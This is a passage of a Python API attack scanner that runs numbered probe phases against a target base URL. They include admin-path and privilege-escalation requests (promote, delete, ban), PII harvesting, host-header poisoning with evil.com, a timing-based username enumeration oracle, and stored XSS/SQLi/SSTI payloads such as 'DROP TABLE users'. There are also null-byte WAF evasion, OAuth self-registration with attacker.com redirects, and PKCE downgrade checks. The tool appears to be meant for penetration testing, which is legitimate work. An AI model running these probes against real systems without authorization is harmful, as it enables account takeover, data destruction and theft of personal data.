    "/management", "/internal", "/internal/users", "/internal/config",
    "/api/management", "/api/internal",
    "/superadmin", "/root", "/system",
    "/api/v1/admin", "/api/v2/admin",
    "/debug", "/api/debug",
]

PRIVILEGED_OPERATIONS = [
    {"path_suffix": "/promote", "method": "POST", "body": {"role": "admin"}},
    {"path_suffix": "/delete", "method": "DELETE", "body": {}},
    {"path_suffix": "/ban", "method": "POST", "body": {"banned": True}},
    {"path_suffix": "/unlock", "method": "POST", "body": {}},
    {"path_suffix": "/reset", "method": "POST", "body": {}},
    {"path_suffix": "/export", "method": "GET", "body": {}},
    {"path_suffix": "/backup", "method": "GET", "body": {}},
    {"path_suffix": "/dump", "method": "GET", "body": {}},
    {"path_suffix": "/grant", "method": "POST", "body": {"permission": "admin"}},
]


def probe_bfla(base, endpoints):
    """
    BFLA: Broken Function Level Authorization (OWASP API5).
    Admin/management functions accessible without admin privileges.
    - Direct probe of admin paths without auth
    - Privileged operation suffixes on known resource paths
    - Function-level privilege escalation attempts
    (hacking-apis ch10, defending-apis ch7)
    """
    findings = []

    # Direct admin path probing
    for path in ADMIN_PATHS:
        r = get(base + path)
        if r and r.status_code not in (404, 401, 403):
            print(f"  [BFLA_ADMIN] {path}: {r.status_code} ({len(r.content)}b) — admin path accessible!")
            findings.append({"type": "bfla_admin_accessible", "path": path,
                              "status": r.status_code, "size": len(r.content),
                              "sample": r.text[:200]})

    # Privileged operations on discovered resource paths
    for ep in endpoints[:10]:
        for op in PRIVILEGED_OPERATIONS[:4]:
            test_url = base + ep.path.rstrip("/") + op["path_suffix"]
            method = op["method"]
            r = req(method, test_url, json=op["body"] if op["body"] else None)
            if r and r.status_code not in (404, 405):
                print(f"  [BFLA_OP] {method} {ep.path}{op['path_suffix']}: {r.status_code}")
                findings.append({"type": "bfla_privileged_op",
                                  "endpoint": f"{method} {ep.path}{op['path_suffix']}",
                                  "status": r.status_code, "sample": r.text[:100]})

    return findings


# ─── Phase 21: PII / Data Exposure Scanner ───────────────────────────────────

PII_PATTERNS = {
    "email":       re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
    "ssn":         re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
    "credit_card": re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b'),
    "phone_us":    re.compile(r'\b(?:\+1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b'),
    "api_key":     re.compile(r'\b(?:api[_-]?key|apikey|access[_-]?key|secret[_-]?key)\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?', re.I),
    "bearer_token":re.compile(r'\bBearer\s+([A-Za-z0-9\-._~+/]+=*)\b'),
    "password_in_response": re.compile(r'"(?:password|passwd|pwd|secret)"\s*:\s*"([^"]{4,})"', re.I),
    "private_key": re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
    "aws_key":     re.compile(r'\bAKIA[0-9A-Z]{16}\b'),
    "ipv4_internal": re.compile(r'\b(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)\d+\.\d+\b'),
}


def probe_excessive_data_exposure(base, endpoints):
    """
    OWASP API3: Excessive Data Exposure.
    Scan all API responses for PII, secrets, internal network indicators.
    APIs often return full model objects when only a subset was needed.
    (defending-apis ch3, pentesting-apis ch8, api-security-for-white-hat-hackers ch2)
    """
    findings = []

    for ep in endpoints:
        for method in ep.methods[:1]:
            url = base + ep.path
            r = req(method, url)
            if not r or len(r.content) == 0:
                continue

            text = r.text
            for pii_type, pattern in PII_PATTERNS.items():
                matches = pattern.findall(text)
                if matches:
                    unique = list(set(str(m) for m in matches))[:5]
                    print(f"  [DATA_EXPOSE_{pii_type.upper()}] {method} {ep.path}: {unique}")
                    findings.append({
                        "type": f"excessive_data_{pii_type}",
                        "endpoint": f"{method} {ep.path}",
                        "matches": unique,
                        "count": len(matches),
                    })

            # Also check for overly large responses (bulk data dump)
            if len(r.content) > 50000:
                try:
                    data = r.json()
                    if isinstance(data, list) and len(data) > 100:
                        print(f"  [DATA_BULK] {method} {ep.path}: {len(data)} records returned unfiltered")
                        findings.append({"type": "excessive_data_bulk", "endpoint": f"{method} {ep.path}",
                                          "record_count": len(data)})
                except Exception:
                    pass

    return findings


# ─── Phase 22: Host Header Injection ─────────────────────────────────────────

HOST_INJECTION_VALUES = [
    "evil.com",
    "evil.com:80",
    "localhost",
    "127.0.0.1",
    "169.254.169.254",
    "internal.corp.local",
]

HOST_OVERRIDE_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
]


def probe_host_header_injection(base, endpoints):
    """
    Host header injection for:
    - Password reset link poisoning (reset URL uses Host: header)
    - Web cache poisoning (cached response with attacker Host)
    - SSRF via internal host resolution
    - Routing-based SSRF (cloud load balancer routes on Host)
    (defending-apis ch7, api-security-for-white-hat-hackers ch7)
    """
    findings = []
    parsed = urlparse(base)
    real_host = parsed.hostname

    reset_paths = ["/password-reset", "/reset-password", "/forgot-password",
                   "/api/password/reset", "/api/auth/reset", "/api/reset"]

    for evil_host in HOST_INJECTION_VALUES[:3]:
        # Direct Host header override
        r = get(base + "/", headers={"Host": evil_host + (f":{parsed.port}" if parsed.port else "")})
        if r:
            if evil_host in r.text or r.status_code not in (400, 421):
                print(f"  [HOST_INJECT] Host: {evil_host} → {r.status_code} ({len(r.content)}b)")
                if evil_host in r.text:
                    print(f"    [HOST_REFLECT] Evil host reflected in response!")
                    findings.append({"type": "host_header_reflect", "host": evil_host,
                                      "status": r.status_code, "sample": r.text[:200]})

        # Override headers
        for override_header in HOST_OVERRIDE_HEADERS[:3]:
            headers = {override_header: evil_host}
            r = get(base + "/", headers=headers)
            if r and evil_host in r.text:
                print(f"  [HOST_OVERRIDE_REFLECT] {override_header}: {evil_host} reflected!")
                findings.append({"type": "host_override_reflect", "header": override_header,
                                  "host": evil_host, "sample": r.text[:200]})

    # Password reset + Host injection (generates poisoned link)
    for path in reset_paths:
        r = post(base + path, json={"email": "test@test.com"},
                 headers={"Host": "evil.com"})
        if r and r.status_code not in (404,):
            print(f"  [HOST_RESET_POISON] {path}: password reset with Host:evil.com → {r.status_code}")
            findings.append({"type": "host_reset_link_poison", "path": path,
                              "status": r.status_code, "sample": r.text[:200]})

    return findings


# ─── Phase 23: Timing Oracle (Auth Enumeration) ──────────────────────────────

def probe_timing_oracle(base, endpoints, samples=8):
    """
    Timing-based user enumeration: valid usernames take longer (bcrypt lookup
    happens before password check; invalid username skips bcrypt entirely).
    Also detects timing differences in token validation paths.
    (hacking-apis ch8, api-security-in-action ch3)
    """
    findings = []
    auth_paths = [ep.path for ep in endpoints
                  if any(x in ep.path for x in ("login", "auth", "signin", "token"))]
    auth_paths += ["/login", "/auth", "/api/login", "/api/auth"]

    known_users = ["admin", "administrator", "root", "user", "test"]
    fake_user = "zzz_definitely_not_real_xyz_12345"

    for path in auth_paths[:3]:
        url = base + path
        for field_set in [("username", "password"), ("email", "password")]:
            uf, pf = field_set

            # Measure fake user baseline
            fake_times = []
            for _ in range(samples):
                t0 = time.time()
                req("POST", url, json={uf: fake_user, pf: "wrongpass_xyz"})
                fake_times.append(time.time() - t0)
            fake_avg = sum(fake_times) / len(fake_times)

            for username in known_users[:3]:
                real_times = []
                for _ in range(samples):
                    t0 = time.time()
                    req("POST", url, json={uf: username, pf: "wrongpass_xyz"})
                    real_times.append(time.time() - t0)
                real_avg = sum(real_times) / len(real_times)

                delta = real_avg - fake_avg
                if abs(delta) > 0.05:  # 50ms difference = statistically significant
                    direction = "SLOWER" if delta > 0 else "FASTER"
                    print(f"  [TIMING_ORACLE] {path} user={username!r}: {direction} by {abs(delta)*1000:.0f}ms vs fake")
                    findings.append({
                        "type": "timing_oracle_user_enum",
                        "path": path,
                        "username": username,
                        "real_avg_ms": real_avg * 1000,
                        "fake_avg_ms": fake_avg * 1000,
                        "delta_ms": delta * 1000,
                    })

    return findings


# ─── Phase 24: Second-Order Injection Detection ───────────────────────────────

SECOND_ORDER_PAYLOADS = [
    # Stored XSS that triggers when retrieved
    "<script>alert(document.domain)</script>",
    '"><img src=x onerror=alert(1)>',
    # Stored SQLi that triggers on retrieval
    "' OR 1=1--",
    "'); DROP TABLE users;--",
    # Stored SSTI
    "{{7*7}}",
    "${7*7}",
    # Path traversal in stored filename
    "../../etc/passwd",
    "/etc/passwd",
    # Null byte
    "test\x00.jpg",
]


def probe_second_order_injection(base, endpoints):
    """
    Second-order injection: store a payload via one endpoint, trigger via another.
    1. POST (store): username="' OR 1=1--"
    2. GET profile: SELECT * FROM users WHERE name='[stored_payload]' → SQLi
    Pattern from defending-apis ch7, hacking-apis ch12.
    """
    findings = []

    # Find write endpoints (POST/PUT) that likely store data
    write_endpoints = [ep for ep in endpoints
                       if any(m in ep.methods for m in ("POST", "PUT", "PATCH"))]
    read_endpoints = [ep for ep in endpoints
                      if "GET" in ep.methods]

    for write_ep in write_endpoints[:3]:
        write_url = base + write_ep.path

        for payload in SECOND_ORDER_PAYLOADS[:4]:
            # Try to store the payload in all write params
            store_data = {}
            for param in list(write_ep.params.keys())[:4]:
                if param != "__body__":
                    store_data[param] = payload

            if not store_data:
                continue

            # Store attempt
            r_write = req("POST", write_url, json=store_data)
            if not r_write or r_write.status_code not in (200, 201, 202):
                continue

            # Try to retrieve and check if payload appears
            for read_ep in read_endpoints[:5]:
                r_read = get(base + read_ep.path)
                if not r_read:
                    continue

                # Check for payload reflection (XSS, SSTI evaluation)
                if payload in r_read.text:
                    print(f"  [2ND_ORDER_REFLECT] {write_ep.path}→{read_ep.path}: payload reflected: {payload[:40]!r}")
                    findings.append({
                        "type": "second_order_reflect",
                        "store_endpoint": write_ep.path,
                        "read_endpoint": read_ep.path,
                        "payload": payload,
                    })
                elif payload == "{{7*7}}" and "49" in r_read.text:
                    print(f"  [2ND_ORDER_SSTI] {write_ep.path}→{read_ep.path}: SSTI evaluated! {{{{7*7}}}}=49")
                    findings.append({
                        "type": "second_order_ssti",
                        "store_endpoint": write_ep.path,
                        "read_endpoint": read_ep.path,
                    })

    return findings


# ─── Phase 25: Null Byte / WAF Evasion ──────────────────────────────────────

NULL_BYTE_VARIANTS = [
    "\x00",        # raw null
    "%00",         # URL-encoded null
    "\x00.jpg",    # null byte file extension bypass
    "%00.jpg",
    "test%00admin",  # null byte parameter truncation
]

ENCODING_BYPASS_CHARS = {
    "'": ["%27", "%2527", "'", "&#x27;", "%u0027"],
    "<": ["%3C", "%253C", "<", "&#x3C;"],
    " ": ["%20", "+", "%09", "%0a", "%0d"],
    "/": ["%2F", "%252F", "/", "//"],
}


def probe_null_byte_evasion(base, endpoints):
    """
    Null byte injection and encoding-based WAF evasion.
    - Null bytes truncate strings in C-backed parsers (PHP, CGI scripts)
    - URL double encoding bypasses WAFs that decode once
    - Unicode normalization bypasses filters checking ASCII
    (hacking-apis ch13, api-security-for-white-hat-hackers ch10)
    """
    findings = []

    for ep in endpoints[:6]:
        url = base + ep.path
        baseline = get(url)
        baseline_code = baseline.status_code if baseline else 0

        for param in list(ep.params.keys())[:3]:
            if param == "__body__":
                continue

            # Per-param sentinel: if probe response matches this, param is ignored
            _sentinel = get(url, params={param: "safe_value_sentinel_xyz_12345"})
            _sentinel_body = _sentinel.text.strip() if _sentinel else None

            for null_var in NULL_BYTE_VARIANTS[:3]:
                r = get(url, params={param: f"safe_value{null_var}admin"})
                if r and r.status_code not in (400, 404):
                    probe_body = r.text.strip()
                    if _sentinel_body is not None and probe_body == _sentinel_body:
                        continue
                    if r.status_code != baseline_code or "admin" in r.text.lower():
                        print(f"  [NULL_BYTE] {ep.path}?{param}=...{null_var!r}...: {r.status_code}")
                        findings.append({"type": "null_byte_inject", "endpoint": ep.path,
                                          "param": param, "variant": repr(null_var),
                                          "status": r.status_code})

        # Path null byte: /admin%00.jpg might bypass /admin auth check
        admin_path = base + "/admin%00.json"
        r = get(admin_path)
        if r and r.status_code not in (404, 400):
            print(f"  [NULL_BYTE_PATH] /admin%00.json: {r.status_code} ({len(r.content)}b)")
            findings.append({"type": "null_byte_path", "path": "/admin%00.json",
                              "status": r.status_code, "size": len(r.content)})

    return findings


# ─── Main ─────────────────────────────────────────────────────────────────────

# ─── Phase 26: OAuth2 Dynamic Client Registration + Token Introspection ─────

OAUTH_DYNAMIC_REG_PATHS = [
    "/oauth/clients", "/oauth2/clients", "/connect/register",
    "/api/oauth/clients", "/.well-known/oauth-authorization-server",
    "/oauth/register", "/auth/clients",
]

TOKEN_INTROSPECT_PATHS = [
    "/oauth/introspect", "/oauth2/introspect", "/connect/introspect",
    "/token/introspect", "/api/oauth/introspect",
]

TOKEN_REVOKE_PATHS = [
    "/oauth/revoke", "/oauth2/revoke", "/connect/revoke",
    "/token/revoke", "/api/oauth/revoke",
]


def probe_oauth_dynamic_reg(base, endpoints):
    """
    OAuth dynamic client registration (RFC7591): POST /oauth/clients without
    auth to self-register a client and get valid client_id/secret.
    Token introspection (RFC7662): POST token to /oauth/introspect — may leak
    token metadata to unauthenticated callers.
    (oauth2-in-action ch12, advanced-api-security ch8)
    """
    findings = []

    # Dynamic client registration
    reg_payload = {
        "redirect_uris": ["https://attacker.com/callback"],
        "token_endpoint_auth_method": "none",
        "grant_types": ["authorization_code", "client_credentials"],
        "response_types": ["code", "token"],
        "client_name": "test-client",
        "scope": "openid profile email admin",
    }

    for path in OAUTH_DYNAMIC_REG_PATHS:
        r = get(base + path)
        if r and r.status_code == 200:
            try:
                data = r.json()
                if "issuer" in data or "registration_endpoint" in data:
                    reg_ep = data.get("registration_endpoint", base + "/oauth/clients")
                    print(f"  [OAUTH_DISCOVERY] {path}: authorization server metadata found")
                    print(f"    registration_endpoint: {reg_ep}")
                    findings.append({"type": "oauth_server_metadata", "path": path, "data": data})
                    # Attempt self-registration
                    r2 = post(reg_ep, json=reg_payload)
                    if r2 and r2.status_code in (200, 201):
                        print(f"  [OAUTH_DYNAMIC_REG] Unauth client registration succeeded!")
                        findings.append({"type": "oauth_dynamic_reg_unauth",
                                          "endpoint": reg_ep, "response": r2.text[:300]})
            except Exception:
                pass

        r = post(base + path, json=reg_payload)
        if r and r.status_code in (200, 201):
            print(f"  [OAUTH_DYNAMIC_REG] {path}: POST succeeded {r.status_code} → client registered!")
            findings.append({"type": "oauth_dynamic_reg_unauth", "path": path,
                              "response": r.text[:300]})

    # Token introspection without credentials
    fake_token = "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0."
    for path in TOKEN_INTROSPECT_PATHS:
        r = post(base + path, data={"token": fake_token})
        if r and r.status_code != 404:
            print(f"  [TOKEN_INTROSPECT] {path}: {r.status_code} ({len(r.content)}b)")
            try:
                data = r.json()
                if data.get("active") is not None:
                    print(f"    active={data.get('active')} — introspect responds without client auth!")
                    findings.append({"type": "token_introspect_unauth", "path": path,
                                      "active": data.get("active"), "data": data})
            except Exception:
                findings.append({"type": "token_introspect_open", "path": path,
                                  "status": r.status_code})

    # Token revocation endpoint
    for path in TOKEN_REVOKE_PATHS:
        r = post(base + path, data={"token": "garbage_token_12345"})
        if r and r.status_code not in (404,):
            print(f"  [TOKEN_REVOKE] {path}: {r.status_code} — revocation endpoint exists")
            findings.append({"type": "token_revoke_endpoint", "path": path, "status": r.status_code})

    return findings


# ─── Phase 27: WebSocket / GraphQL Subscription Enumeration ──────────────────

WS_UPGRADE_PATHS = [
    "/ws", "/websocket", "/graphql", "/api/ws", "/socket",
    "/api/graphql", "/subscriptions", "/api/subscriptions",
    "/live", "/events", "/stream",
]

GRAPHQL_SUBSCRIPTION_QUERY = '{"type":"connection_init","payload":{}}'
GRAPHQL_SUBSCRIPTION_SUBSCRIBE = (
    '{"id":"1","type":"subscribe","payload":{"query":"subscription { __typename }"}}'
)


def probe_websocket(base):
    """
    WebSocket enumeration:
    - Detect WS upgrade support via HTTP Upgrade: websocket header
    - Probe GraphQL subscription endpoint (ws_protocol=graphql-transport-ws)
    - Check for Server-Sent Events (text/event-stream) streams
    (grpc-up-and-running ch6, graphql-best-practices ch10)
    """
    findings = []

    for path in WS_UPGRADE_PATHS:
        url = base + path

        # Check for SSE (Server-Sent Events) stream
        r = get(url, headers={"Accept": "text/event-stream"})
        if r and r.headers.get("content-type", "").startswith("text/event-stream"):
            print(f"  [SSE_STREAM] {path}: Server-Sent Events stream detected!")
            findings.append({"type": "sse_stream", "path": path, "content": r.text[:200]})

        # Check for WebSocket upgrade acceptance
        ws_headers = {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "Sec-WebSocket-Protocol": "graphql-transport-ws",
        }
        r = get(url, headers=ws_headers)
        if r and r.status_code == 101:
            print(f"  [WEBSOCKET_UPGRADE] {path}: WS upgrade accepted (101)!")
            findings.append({"type": "websocket_upgrade", "path": path})
        elif r and r.status_code not in (404, 400, 405):
            if "upgrade" in r.headers.get("connection", "").lower():
                print(f"  [WEBSOCKET_HINT] {path}: {r.status_code} with Upgrade hint in headers")
                findings.append({"type": "websocket_hint", "path": path, "status": r.status_code})

    # GraphQL subscription-specific check
    for path in ["/graphql", "/api/graphql"]:
        r = post(base + path, json={
            "query": "subscription { __typename }",
        })
        if r and r.status_code not in (404,):
            print(f"  [GRAPHQL_SUBSCRIPTION] {path}: subscription query returned {r.status_code}")
            try:
                data = r.json()
                if "errors" in data:
                    for err in data["errors"]:
                        msg = err.get("message", "")
                        if "subscription" in msg.lower() and "not support" in msg.lower():
                            print(f"    GraphQL subscriptions NOT supported on HTTP (expect WS)")
                        else:
                            print(f"    Error: {msg[:80]}")
            except Exception:
                pass
            findings.append({"type": "graphql_subscription_probe", "path": path,
                              "status": r.status_code})

    return findings


# ─── Phase 28: Pagination Traversal (BOLA at Scale) ──────────────────────────

def probe_pagination_traversal(base, endpoints):
    """
    Pagination link-following: iterate all pages of collection endpoints.
    Goal: detect unbounded enumeration, different user data across pages,
    and BOLA (accessing resources beyond what your ID range should allow).
    Follows RFC5988 Link headers (rel=next) and common JSON pagination patterns.
    (restful-web-apis ch11, api-security-in-action ch4)
    """
    findings = []

    collection_endpoints = [
        ep for ep in endpoints
        if "GET" in ep.methods and any(
            x in ep.path for x in
            ("/users", "/items", "/products", "/orders", "/files", "/records",
             "/results", "/data", "/list", "/all")
        )
    ]

    for ep in collection_endpoints[:3]:
        url = base + ep.path
        page = 1
        total_records = 0
        pages_seen = 0

        while pages_seen < 5:
            r = get(url, params={"page": page, "per_page": 100, "limit": 100, "offset": (page - 1) * 100})
            if not r or r.status_code != 200:
                break

            # RFC5988 Link header pagination
            link_header = r.headers.get("link", "")
            next_url = None
            if 'rel="next"' in link_header:
                import re as _r
                m = _r.search(r'<([^>]+)>;\s*rel="next"', link_header)
                if m:
                    next_url = m.group(1)

            try:
                data = r.json()
                if isinstance(data, list):
                    count = len(data)
                elif isinstance(data, dict):
                    for key in ("data", "results", "items", "records", "users"):
                        if key in data and isinstance(data[key], list):
                            count = len(data[key])
                            break
                    else:
                        count = 0
                else:
                    count = 0
                total_records += count
            except Exception:
                count = 0

            pages_seen += 1
            if count == 0 or (not next_url and count < 50):
                break

            if pages_seen == 1 and count > 0:
                print(f"  [PAGINATION] {ep.path}: {count} records/page, following pages...")

            if next_url:
                url = next_url
                page = 1
            else:
                page += 1

        if total_records > 500:
            print(f"  [BULK_ENUM] {ep.path}: {total_records} total records enumerable across {pages_seen} pages!")
            findings.append({"type": "bulk_enumeration", "endpoint": ep.path,
                              "total_records": total_records, "pages": pages_seen})
        elif total_records > 0:
            print(f"  [PAGINATION_WALK] {ep.path}: {total_records} records across {pages_seen} pages")
            findings.append({"type": "pagination_walk", "endpoint": ep.path,
                              "total_records": total_records, "pages": pages_seen})

    return findings


# ─── Phase 29: Deprecation / Shadow Version Detection ────────────────────────

DEPRECATION_HEADER_NAMES = [
    "Sunset", "Deprecation", "X-Deprecated",
    "X-Api-Deprecated", "API-Deprecated-Version",
    "X-Api-Sunset-Date",
]

SHADOW_VERSION_PATHS = [
    "/v0", "/v0.1", "/api/v0",
    "/v1-beta", "/v1-alpha", "/api/v1-beta",
    "/dev", "/staging", "/internal",
    "/api/internal", "/api/dev",
    "/api/legacy", "/legacy",
    "/api/old", "/old",
    "/beta", "/alpha",
]


def probe_shadow_versions(base, endpoints):
    """
    Deprecated/shadow version detection:
    - Sunset/Deprecation response headers on endpoints (version still alive but marked deprecated)
    - Old version paths: /v0, /beta, /legacy, /dev, /internal
    Shadow APIs often skip auth enforcement, validation, or rate limiting added in newer versions.
    (continuous-api-management ch5, mastering-api-architecture ch6)
    """
    findings = []

    # Check deprecation headers on existing endpoints
    for ep in endpoints[:8]:
        r = get(base + ep.path)
        if not r:
            continue
        for header in DEPRECATION_HEADER_NAMES:
            val = r.headers.get(header, "")
            if val:
                print(f"  [DEPRECATED] {ep.path}: {header}: {val}")
                findings.append({"type": "deprecated_endpoint", "path": ep.path,
                                  "header": header, "value": val})

    # Probe shadow/legacy version paths
    for path in SHADOW_VERSION_PATHS:
        r = get(base + path)
        if r and r.status_code not in (404, 410):
            print(f"  [SHADOW_VERSION] {path}: {r.status_code} ({len(r.content)}b) — shadow version alive!")
            body_sample = r.text[:150]
            findings.append({"type": "shadow_version", "path": path,
                              "status": r.status_code, "sample": body_sample})

            # Check if shadow version has less auth on known restricted endpoints
            for ep in [e for e in endpoints if e.auth_required][:2]:
                shadow_url = base + path + ep.path
                r2 = get(shadow_url)
                if r2 and r2.status_code == 200:
                    print(f"  [SHADOW_AUTH_SKIP] {path}{ep.path}: 200 on shadow while main requires auth!")
                    findings.append({"type": "shadow_auth_bypass", "shadow": path,
                                      "endpoint": ep.path, "sample": r2.text[:200]})

    return findings


# ─── Phase 30: OAuth2 State Parameter + PKCE Downgrade ───────────────────────

OAUTH_AUTH_ENDPOINT_PATHS = [
    "/oauth/authorize", "/oauth2/authorize", "/connect/authorize",
    "/auth/authorize", "/api/oauth/authorize",
    "/oauth/auth", "/oauth2/auth",
]


def probe_oauth_state_pkce(base):
    """
    OAuth2 state parameter absence = CSRF vulnerability (RFC6819 §5.3.5).
    PKCE downgrade: if code_challenge_method accepted with plain → SHA256 bypass.
    Missing state validation: authorization server doesn't enforce state parameter.
    (oauth2-in-action ch7, ch9)
    """
    findings = []

    for path in OAUTH_AUTH_ENDPOINT_PATHS:
        # Missing state parameter - valid OAuth request without state
        r = get(base + path, params={
            "response_type": "code",
            "client_id": "test_client",
            "redirect_uri": "https://attacker.com/callback",
        })
        if r and r.status_code not in (404,):
            print(f"  [OAUTH_STATE_MISSING] {path}: auth endpoint accepts request without state parameter!")
            findings.append({"type": "oauth_state_missing", "path": path, "status": r.status_code})

        # PKCE plain downgrade
        r = get(base + path, params={
            "response_type": "code",
            "client_id": "test_client",
            "redirect_uri": "https://example.com/callback",
            "code_challenge": "testchallenge",
            "code_challenge_method": "plain",
        })
        if r and r.status_code not in (400, 404):
            print(f"  [PKCE_PLAIN_ACCEPTED] {path}: plain code_challenge_method accepted (should require S256)")
            findings.append({"type": "pkce_plain_accepted", "path": path, "status": r.status_code})

        # Open redirect: redirect_uri validation
        r = get(base + path, params={
            "response_type": "token",
            "client_id": "test_client",
            "redirect_uri": "https://evil.com/callback",
            "state": "csrf_test",
        })
        if r and r.status_code in (200, 302):
            location = r.headers.get("location", "")
            if "evil.com" in location:
                print(f"  [OAUTH_OPEN_REDIRECT] {path}: redirect_uri not validated! Redirects to evil.com")
                findings.append({"type": "oauth_open_redirect", "path": path, "location": location})

    return findings


def run_re(base_url, depth="normal", focus=None):
    """Full API reverse engineering pipeline."""
    base = base_url.rstrip("/")
    api = APIMap(base_url=base)

    print(f"\n{'='*60}")
    print(f"API-RE: {base}")
    print(f"{'='*60}")

    # Phase 1: Framework detection
    print("\n[1] Framework detection...")
    frameworks = detect_framework(base)
    for fw, confidence in frameworks.items():
        print(f"  {fw}: {confidence:.0%} confidence")
    api.framework = max(frameworks, key=frameworks.get) if frameworks else "unknown"

    # Phase 2: OpenAPI harvest
    print("\n[2] OpenAPI schema harvest...")
    spec = harvest_openapi(base)
    if spec:
        api.openapi = spec
        api.endpoints = parse_openapi(spec)
        print(f"  Found OpenAPI spec: {len(api.endpoints)} endpoints")
        for ep in api.endpoints:
            print(f"  {ep.methods[0]} {ep.path} | params: {list(ep.params.keys())}")
    else:
        print("  No OpenAPI spec found")

    # Phase 2b: API version discovery
    print("\n[2b] API version discovery...")
    versions = discover_versions(base)

    # Phase 3: Path fuzzing
    print("\n[3] Path fuzzing...")
    found_paths = fuzz_paths(base)

    if not api.endpoints:
        for (path, method), r in found_paths.items():
            existing = next((e for e in api.endpoints if e.path == "/" + path), None)
            if existing:
                if method not in existing.methods:
                    existing.methods.append(method)
            else:
                ep = Endpoint(path="/" + path, methods=[method])
                ep.responses[r.status_code] = {
                    "content_type": r.headers.get("content-type"),
                    "body": r.text[:200],
                }
                api.endpoints.append(ep)

    # Phase 3b: GraphQL introspection
    print("\n[3b] GraphQL probe...")
    gql_findings = probe_graphql(base)

    # Phase 3c: Hidden param discovery
    print("\n[3c] Hidden parameter discovery...")
    hidden_params = discover_hidden_params(base)

    # Phase 4: Injection probing
    if focus in (None, "injection"):
        print("\n[4] Injection probing...")
        for ep in api.endpoints:
            for param_name in list(ep.params.keys())[:5]:
                if param_name == "__body__":
                    continue
                for method in ep.methods[:1]:
                    signals = probe_param(base, ep.path, param_name, method)
                    if signals:
                        # Only record categories with confirmed signals, not all probe types
                        ep.vuln_signals.extend(list(signals.keys()))

    # Phase 4b: Verb tampering
    print("\n[4b] Verb tampering...")
    verb_findings = probe_verb_tampering(base, api.endpoints)

    # Phase 4c: Content-type switching
    print("\n[4c] Content-type switching...")
    ct_findings = probe_content_type_switch(base, api.endpoints)

    # Phase 4d: Parameter pollution
    print("\n[4d] Parameter pollution...")
    poll_findings = probe_param_pollution(base, api.endpoints)

    # Phase 4e: Mass assignment
    print("\n[4e] Mass assignment probe...")
    mass_findings = probe_mass_assignment(base, api.endpoints)

    # Phase 4f: BOLA/IDOR
    if focus in (None, "bola"):
        print("\n[4f] BOLA/IDOR probe...")
        idor_findings = probe_bola(base, api.endpoints)

    # Phase 4g: JWT analysis
    if focus in (None, "jwt", "auth"):
        print("\n[4g] JWT analysis...")
        jwt_findings = analyze_tokens_in_response(base, api.endpoints)

    # Phase 5: Error extraction
    print("\n[5] Error leakage analysis...")
    errors = extract_info_from_errors(base, api.endpoints)
    for e in errors:
        print(f"  [{e['type']}] {e['endpoint']}: {e['body'][:120]}")
    api.notes.extend([e['body'][:200] for e in errors])

    # Phase 6: State change detection
    if depth == "deep":
        print("\n[6] State change mapping...")
        changes = map_state_changes(base, api.endpoints)
        for c in changes:
            print(f"  [STATE_CHANGE] {c['endpoint']}: {c['note']}")

    # Phase 7: Rate limiting
    if depth in ("normal", "deep"):
        print("\n[7] Rate limit probe...")
        rate_findings = probe_rate_limiting(base, api.endpoints)

    # Phase 8: OAuth2/OIDC
    if focus in (None, "oauth2", "auth"):
        print("\n[8] OAuth2/OIDC attack surface...")
        oauth_findings = probe_oauth2(base)

    # Phase 9: gRPC
    if focus in (None, "grpc"):
        print("\n[9] gRPC enumeration...")
        grpc_findings = probe_grpc(base)

    # Phase 10: GraphQL advanced
    if focus in (None, "graphql"):
        print("\n[10] GraphQL advanced attacks...")
        gql_adv_findings = probe_graphql_advanced(base)

    # Phase 11: Rate limit bypass
    if depth in ("normal", "deep"):
        print("\n[11] Rate limit bypass probes...")
        rl_bypass = probe_rate_limit_bypass(base, api.endpoints)

    # Phase 12: SOAP/WSDL
    if focus in (None, "soap"):
        print("\n[12] SOAP/WSDL discovery...")
        soap_findings = probe_wsdl_soap(base)

    # Phase 13: JSON-RPC
    print("\n[13] JSON-RPC enumeration...")
    jsonrpc_findings = probe_jsonrpc(base)

    # Phase 14: Business logic
    if focus in (None, "biz"):
        print("\n[14] Business logic probes...")
        biz_findings = probe_business_logic(base, api.endpoints)

    # Phase 15: Webhook SSRF
    if focus in (None, "ssrf"):
        print("\n[15] Webhook SSRF...")
        webhook_findings = probe_webhook_ssrf(base, api.endpoints)

    # Phase 16: Default credentials
    if focus in (None, "auth", "creds"):
        print("\n[16] Default credentials probe...")
        cred_findings = probe_default_creds(base)

    # Phases 17-30: independent — run in parallel via ThreadPoolExecutor
    _phase_queue = []

    if focus in (None, "auth", "cors") and depth in ("normal", "deep"):
        _phase_queue.append((17, "CORS misconfiguration", probe_cors, (base, api.endpoints)))
    if focus in (None, "jwt", "auth") and depth in ("normal", "deep"):
        _phase_queue.append((18, "JWT alg confusion", probe_jwt_alg_confusion, (base, api.endpoints)))
    if focus in (None, "injection", "nosql") and depth in ("normal", "deep"):
        _phase_queue.append((19, "NoSQL injection", probe_nosql_injection, (base, api.endpoints)))
    if focus in (None, "bola", "auth", "bfla") and depth in ("normal", "deep"):
        _phase_queue.append((20, "BFLA", probe_bfla, (base, api.endpoints)))
    if focus in (None, "schema", "pii") and depth in ("normal", "deep"):
        _phase_queue.append((21, "Data exposure / PII", probe_excessive_data_exposure, (base, api.endpoints)))
    if focus in (None, "injection", "ssrf") and depth in ("normal", "deep"):
        _phase_queue.append((22, "Host header injection", probe_host_header_injection, (base, api.endpoints)))
    if focus in (None, "auth", "creds", "timing") and depth == "deep":
        _phase_queue.append((23, "Timing oracle", probe_timing_oracle, (base, api.endpoints)))
    if focus in (None, "injection") and depth == "deep":
        _phase_queue.append((24, "Second-order injection", probe_second_order_injection, (base, api.endpoints)))
